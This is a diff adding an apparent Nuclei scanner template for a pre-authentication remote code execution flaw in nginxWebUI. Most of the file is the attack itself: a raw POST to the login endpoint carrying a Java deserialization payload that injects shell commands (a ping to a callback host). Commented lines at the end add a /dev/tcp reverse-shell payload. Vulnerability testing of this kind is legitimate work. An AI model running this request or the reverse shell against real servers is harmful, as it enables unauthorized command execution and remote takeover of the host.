@@ -1,0 +1,34 @@
+id: nginxwebui-Solon-rce
+
+info:
+  name: Template Name
+  author: wangzong
+  severity: critical
+  description: 最新版 nginxWebui 前台 RCE。使⽤jdk环境下启动nginxWebUi发现就能正常RCE了。对 jre 启动的目前不受影响。
+  reference:
+    - https://
+  tags: tags
+
+http:
+  - raw:
+      - |-
+        POST /adminPage/login/getAuth HTTP/1.1
+        Host: {{Hostname}}
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
+        Content-Type: application/json
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+        Content-Length: 95
+
+        {"name": {"@type": "sun.print.UnixPrintServiceLookup",
+        "lpcFirstCom": [";ping {{interactsh-url}};",";ping {{interactsh-url}};"]}}
+    matchers:
+      - type: word
+        part: interactsh_protocol # Confirms the DNS Interaction
+        words:
+          - "dns"
+#";sh -i >& /dev/tcp/xxx.xxx.xxx.xxx/xxxx 0>&1;",
+#";sh -i >& /dev/tcp/xxx.xxx.xxx.xxx/xxxx 0>&1;"
